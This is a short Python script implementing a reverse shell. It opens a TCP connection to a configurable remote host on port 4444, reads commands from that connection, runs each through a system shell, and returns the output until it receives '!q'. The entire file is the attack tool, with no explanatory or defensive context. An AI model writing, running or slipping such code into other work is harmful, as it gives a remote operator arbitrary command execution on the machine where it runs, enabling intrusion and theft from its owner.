import socket
import subprocess

lhost = "Changeme"
lport = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((lhost, lport))

while True:
	command = sock.recv(2048)
	if command == "!q":
		break

	else:
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		sock.send(output)

sock.close()